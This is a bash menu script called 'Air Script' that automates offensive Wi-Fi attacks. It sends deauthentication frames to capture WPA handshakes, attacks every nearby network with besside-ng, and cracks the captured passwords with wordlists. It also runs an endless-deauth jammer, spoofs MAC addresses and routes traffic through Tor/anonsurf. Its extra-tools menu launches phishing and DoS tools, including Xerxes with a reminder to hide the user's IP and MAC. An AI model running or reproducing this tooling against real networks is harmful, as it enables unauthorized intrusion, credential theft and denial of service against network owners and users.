#!/bin/bash


# Ensure we are being ran as root
if [ $(id -u) -ne 0 ]; then
	echo "This script must be ran as root"
	exit 1
fi
network () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
airmon-ng start $foo > /dev/null 2>&1
echo "Please, select the interface in monitor mode:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
cd /home/*/air-script
}
chmod -R 755 *
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1
clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
apt-get install -y aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if $foo is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}$foo${White}] Enabled!"
fi
}


checkServices () {
sudo systemctl start postfix > /dev/null 2>&1
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1


}

banner () {        ##### Banner #####
echo -e "${Red}




 ▄▄▄       ██▓ ██▀███                            
▒████▄    ▓██▒▓██ ▒ ██▒                          
▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒                          
░██▄▄▄▄██ ░██░▒██▀▀█▄                            
 ▓█   ▓██▒░██░░██▓ ▒██▒                          
 ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░                          
  ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░                          
  ░   ▒    ▒ ░  ░░   ░                           
      ░  ░ ░     ░                               
                                                 
  ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░   
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░    
░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      
      ░  ░ ░         ░      ░                    
         ░                                  "
echo -e "${Yellow} \n             Hack the world!!!     "
echo -e "${Green}\n                    Developed by: Liam Bendix"
echo -e "${Green}                         Version: 2.0.4 Stable"
}

menu () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Passowrd(s)"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change IP Address"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}View log file"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Extra Tools"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Help"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Passowrd(s).."
     crack
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
     wifiJammer
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
     macChange
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
     anonsurf
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
     log
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
     tools
     exit 0
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
     Help
     exit 0
     ;;
  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

wifiHacking () {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifite Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifite2 Attacks"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Wifiphisher Attacks"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Fern Attacks"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Airogeddon Attacks"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
     AirScriptMenu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
     FluxionMenu
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifite.."
     Wifite
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifite2.."
     Wifite2
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Wifiphisher.."
     StartWifiphisher
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 Fern.."
     Fern
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Airgeddon.."
     airogeddon
     exit 0
     ;;
  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


 AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
     AirScript
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
     attackAll
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
     crack
     exit 0
     ;;
  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}



AirScript() {
notification
}


notification () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackYes; break;;
        [Nn]* ) attackNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackYes () {
echo "Enter your email address for notifications: " email
read email
echo "Remember to check your spam folder!"
sleep 3
network
monitor
sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
sudo aireplay-ng --deauth 20 -a $bssid $foo
stopMon
echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
checkServices 
sleep 10
checkServices 
check_cap_files
check_eapol_in_cap
sendemail -f airscript@mail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
crack
}


attackNo () {
network
monitor
sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
echo -e "\e[32mAttacking...\e[0m"
sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
checkServices 
check_cap_files
check_eapol_in_cap
stopMon
crack

}









notification1 () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackAllYes; break;;
        [Nn]* ) attackAllNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackAll() {
notification1
}


attackAllYes () {
echo "Enter your email address for notifications: " email
read email
sleep 3
echo "Remeber to check your spam folder!"
network
sudo besside-ng $foo
stopMon
checkservices
sleep 10
check_cap_files
check_eapol_in_cap
sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
crack
}


attackAllNo () {
network
sudo besside-ng $foo
stopMon
sudo chmod -R 755 air-crack
echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
checkservices
check_cap_files
check_eapol_in_cap
crack
}




FluxionMenu() {
cd /bin/air-script/tools
cd fluxion
sudo ./fluxion.sh
}

Wifite () {
sudo wifite
}

Wifite2 () {
wifite
cd /bin/air-script/tools
cd wifite2
sudo ./Wifite.py
}

crack () {
echo "Your current directory:"
pwd
ls
read -p "Enter path to wordlist : " wordlist
 $wordlist
sudo aircrack-ng -w $wordlist *.cap
#sudo aircrack-ng -w $wordlist wep.cap
#sudo aircrack-ng -w $wordlist wpa.cap
#sudo aircrack-ng -w wordlist.txt wep.cap
#sudo aircrack-ng -w wordlist.txt wpa.cap
#sudo aircrack-ng -w wordlist.txt *.cap
menu
}

StartWifiphisher () {
wifiphisher

}

Fern () {
sudo fern-wifi-cracker
}


airogeddon () {
cd /bin/air-script/tools
cd airgeddon
sudo bash airgeddon.sh
}


wifiJammer () {        ##### Sending unlimited DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel $foo > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
}






monitor() {
    #foo="wlan0"   # Example interface, replace with the correct one if needed
   airmon-ng check kill
    # Check if the interface exists
    if ! iwconfig $foo > /dev/null 2>&1; then
        echo "Interface $foo not found. Please check your device."
        exit 1
    fi

    # Start monitor mode (check if this works before continuing)
#    echo "Starting monitor mode on $foo..."
 #   airmon-ng start $foo > /dev/null 2>&1
  #  if [ $? -ne 0 ]; then
   #     echo "Failed to start monitor mode on $foo. Please check your device."
    #    exit 1
    #fi
# Start monitor mode (check if this works before continuing)
echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
airmon-ng start $foo > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
    exit 1
fi
    # Set up a cleanup trap
    trap "airmon-ng stop $foo > /dev/null; rm -f generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT

    # Run airodump-ng in background and redirect output
    echo "Starting airodump-ng scan on $foo..."
    airodump-ng --output-format kismet --write generated $foo > /dev/null & 
    airodump_pid=$!   # Capture PID of airodump-ng
    sleep 20

    # Check if the airodump-ng process is still running
    if ps -p $airodump_pid > /dev/null; then
        echo "Killing airodump-ng process..."
        kill $airodump_pid
    else
        echo "airodump-ng process already stopped."
    fi

    # Check if the CSV file was created
    if [ ! -f "generated-01.kismet.csv" ]; then
        echo "Error: generated-01.kismet.csv not found. Is airodump-ng running correctly?"
        exit 1
    fi

    # Remove the header from the CSV
    sed -i '1d' generated-01.kismet.csv

    # Debugging: Print out the first few rows of the CSV to ensure we're capturing the correct columns
    echo -e "\n\n${Red}CSV Raw Data (First 5 lines)${White}:"
    head -n 5 generated-01.kismet.csv

    # Print the available networks (SSID and BSSID) for the user to select
    echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
    awk -F ";" '{gsub(/^[ \t]+|[ \t]+$/, "", $3); gsub(/^[ \t]+|[ \t]+$/, "", $4); print NR, $3, $4}' generated-01.kismet.csv | nl -n ln -w 8

    # Get the number of networks in the file
    total_networks=$(wc -l < generated-01.kismet.csv)
    if [ -z "$total_networks" ] || [ "$total_networks" -eq 0 ]; then
        echo "No networks found. Please check if airodump-ng is running correctly."
        exit 1
    fi

    # Prompt user to select a target network
    targetNumber=1000
    while [ ${targetNumber} -gt ${total_networks} ] || [ ${targetNumber} -lt 1 ]; do 
        echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber
    done

   # Extract network details using awk with whitespace handling
targetName=$(awk -F ';' "NR==${targetNumber} {print \$3}" generated-01.kismet.csv | xargs)
bssid=$(awk -F ';' "NR==${targetNumber} {print \$4}" generated-01.kismet.csv | xargs)
channel=$(awk -F ';' "NR==${targetNumber} {print \$6}" generated-01.kismet.csv | xargs)

# Output the selected target
echo -e "\n${Green}You have selected the following network:${White}"
echo -e "${Green}SSID:${White} ${targetName}"
echo -e "${Green}BSSID:${White} ${bssid}"
echo -e "${Green}Channel:${White} ${channel}"

# Set the wifi card to the target channel
sudo iwconfig $foo channel $channel

    # Check if BSSID is empty, and alert the user if necessary
    if [ -z "$bssid" ]; then
        echo -e "${Red}Error: Invalid BSSID. Please try again with a valid target network.${White}"
        exit 1
    fi

    # Clean up the CSV file
    rm generated-01.kismet.csv 2> /dev/null

    # Confirm that we are preparing for the attack
    echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}




networkselect () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done

}



# Function to check if EAPOL frames exist in a .cap file
check_eapol_in_cap() {
    local cap_file=$1
    if tshark -r "$cap_file" -Y "eapol" | grep -q "EAPOL"; then
        echo "EAPOL data found in $cap_file"
        return 0
    else
        echo "No EAPOL data found in $cap_file"
        return 1
    fi
}

# Function to check if .cap files exist and verify EAPOL frames
check_cap_files() {
    # Clear the screen
    #clear

    # Check if any .cap files exist in the current directory
    if ls *.cap &> /dev/null; then
        # .cap files are present
        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
        
        # Loop through each .cap file to check for EAPOL frames
        for cap_file in *.cap; do
            echo -e "\nChecking $cap_file for EAPOL frames..."
            if check_eapol_in_cap "$cap_file"; then
                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
                return 0  # Stop after finding a valid file with EAPOL
            else
                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
            fi
        done
        
        # If no valid .cap files with EAPOL are found, exit
        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
        deauthAttack
    else
        # No .cap files found
        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
        sleep 3
        deauthAttack
    fi
}


deauthAttack () {
echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
echo -e "\e[32mAttacking... This could take a few minutes... Please wait!\e[0m"
sudo aireplay-ng --deauth 50 -a $bssid $foo > /dev/null 2>&1
check_cap_files
check_eapol_in_cap
 } 

macChange() {
     ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Restore Original MAC Address"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Show Current MAC Address"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
     spoofMAC
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
     RestoreMAC
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
     showMAC
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


spoofMAC(){
networkselect
macchanger -s $foo
sudo ifconfig $foo down
sudo macchanger -r $foo
sudo ifconfig $foo up
macchanger -s $foo
menu
}

RestoreMAC(){
networkselect
sudo ifconfig $foo down
sudo macchanger -p $foo
sudo ifconfig $foo up
sudo macchanger -s $foo
menu
}

showMAC() {
networkselect
macchanger -s $foo
menu


}





anonsurf (){ 
       ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
     anonsurfStart
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
     anonsurfStatus
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
     anonsurfStop
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
     anonsurfRestart
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
     anonsurfChange
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
     anonsurfStarti2p
     exit 0
     ;; 
  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
     anonsurfStopi2p
     exit 0
     ;; 
  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
     anonip
     exit 0
     ;; 
  9) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


anonsurfStart(){
sudo anonsurf start
}

anonsurfStatus(){
sudo anonsurf status
}


anonsurfStop(){
sudo anonsurf stop
}

anonsurfRestart(){
sudo anonsurf restart
}

anonsurfChange(){
sudo anonsurf change
}

anonsurfStarti2p(){
sudo anonsurf starti2p
}
anonsurfStopi2p(){
sudo anonsurf stopi2p
}

anonip(){
sudo anonsurf myip
}





      tools () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Routersploit"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Zatacker"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Morpheus"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Cupp"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Dracnmap"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}KickThemOut"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Ghost-Phisher"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Xerxes"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Websploit"
echo -e "      ${Red}[${Blue}10${Red}] ${Green}Angry IP Scanner"
echo -e "      ${Red}[${Blue}11${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Routersploit"
  routersploit
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Zatacker"
  Zatacker
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Morpheus"
  morpheus
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Cupp"
  Cupp
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Dracnmap"
  dracnmap
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 KickThemOut"
  kickthemout
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Ghost-Phisher"
  ghostPhisher
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Xerxes"
  Xerxes
     ;;
  9) echo -e "\n[${Green}Selected${White}] Option 9 Websploit"
  websploit
     ;;
  10) echo -e "\n[${Green}Selected${White}] Option 10 Angry IP Scanner"
  AngryIpScanner
     ;;
  11) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


zirikatu () {
cd /bin/air-script/tools
cd zirikatu
sudo ./zirikatu.sh

}

routersploit () {
cd /bin/air-script/tools
cd routersploit
python3 rsf.py

}

Zatacker () {
cd /bin/air-script/tools
cd Zatacker
./ZT.sh
}

morpheus () {
cd /bin/air-script/tools
cd morpheus
sudo ./morpheus.sh
}

Hakku () {
cd /bin/air-script/tools
cd hakkuframework
./hakku

}

Trity () {
trity

}

Cupp () {
cd /bin/air-script/tools
cd cupp
python3 cupp.py -i
}

dracnmap () {
cd /bin/air-script/tools
cd Dracnmap
chmod +x dracnmap-v2.2.sh
sudo ./dracnmap-v2.2.sh

}

kickthemout () {
cd /bin/air-script/tools
cd kickthemout
sudo python3 kickthemout.py

}


ghostPhisher () {
cd /bin/air-script/tools
cd ghost-phisher
cd Ghost-Phisher
chmod +x ghost.py
sudo ./ghost.py
}


Xerxes () {
cd /bin/air-script/tools
cd XERXES
echo "Xerxes DoS Attack"
sleep 3
echo "Remeber to hide your IP and MAC"
sleep 3
read -p "Enter the IP & Port of target (e.g. 102.102.102.102:80) : " ip
sudo ./xerxes $ip

}


Katana () {
cd /bin/air-script/tools
cd KatanaFramework
sudo ./ktf.run
sudo ./ktf.run -h
echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
  
}

websploit () {
sudo websploit
}



BeeLogger () {
cd /bin/air-script/tools
cd BeeLogger
sudo python bee.py
}


ezsploit () {
cd /bin/air-script/tools
cd ezsploit
sudo ./ezploit.sh


}

TheFatRat () {
sudo fatrat

}

AngryIpScanner () {
sudo sh /usr/bin/ipscan
}


Sn1per () {
cd /bin/air-script/tools
cd Sn1per
sudo sniper

}


redhawk () {
cd /bin/air-script/tools
cd RED_HAWK
php rhawk.php

}

Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up ad hoc network on my Pi?"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}My tool(s) are not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Turn off monitor mode"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Uninstall"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Clean"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up ad hoc network?"
     instructions
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
     stopMon
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
    uninstall
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Cleaning captured handshakes.."
    clean
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


clean () {
sudo rm -r *cap> /dev/null 2>&1
sudo rm -r ipscan_3.7.6_all.deb> /dev/null 2>&1
}

uninstall () {
sudo ./uninstall.sh 
}

stopMon () {
sudo airmon-ng stop $foo > /dev/null 2>&1
sudo systemctl start NetworkManager > /dev/null 2>&1
systemctl start wpa_supplicant  > /dev/null 2>&1
echo -e "\e[32mmonitor mode disabled for $foo\e[0m"
}




instructions(){

echo " I know you are a lazy noob, this will do it for you:"
echo " https://github.com/B3ND1X/nm4n00bz"

}

fix(){
echo "$(tput setaf 2)Attempting to fix! Please wait..."
./install.sh

}



log(){
cat besside.log
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}$foo${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

targeted () {
checkDependencies
checkWiFiStatus
banner
menu
checkServices 
}

targeted


